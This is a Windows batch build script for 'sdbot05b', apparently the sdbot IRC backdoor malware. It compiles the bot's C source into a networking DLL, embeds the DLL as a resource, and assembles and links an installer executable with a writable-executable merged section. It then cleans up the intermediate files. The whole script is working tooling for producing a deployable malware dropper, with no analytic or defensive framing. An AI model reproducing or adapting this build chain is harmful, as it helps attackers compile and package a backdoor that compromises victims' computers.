@echo off

:: ================================================== ::
:: change 'd:\lcc' to the location of your lcc folder ::
:: ================================================== ::
set lccdir=d:\lcc

:: ====================================================== ::
:: change 'd:\masm32' to the location of your masm folder ::
:: ====================================================== ::
set masm32dir=d:\masm32
                              
echo compiling sdbot...
%lccdir%\bin\lcc -o -a -unused sdbot05b.c
echo linking sdbot...
%lccdir%\bin\lcclnk -dll -subsystem windows -s sdbot05b.obj wsock32.lib wininet.lib shell32.lib icmp.lib winmm.lib
echo building resource...
echo #include "%masm32dir%\include\resource.h" >> rsrc.rc
echo 1000 RCDATA DISCARDABLE sdbot05b.dll >>  rsrc.rc
%masm32dir%\bin\rc /v rsrc.rc
echo converting resource...
%masm32dir%\bin\cvtres /machine:ix86 rsrc.res
echo assembling installer...
%masm32dir%\bin\ml /c /coff sdbot05b.asm
echo linking installer...
%masm32dir%\bin\link /filealign:0x200 /merge:.data=.text /ignore:4078 /section:.text,RWX /subsystem:windows sdbot05b.obj rsrc.obj
@echo off
del sdbot05b.obj
del sdbot05b.exp
del sdbot05b.lib
del sdbot05b.dll
del rsrc.rc
del rsrc.obj
del rsrc.res
echo done.
echo.
dir sdbot05b.*
echo.
pause
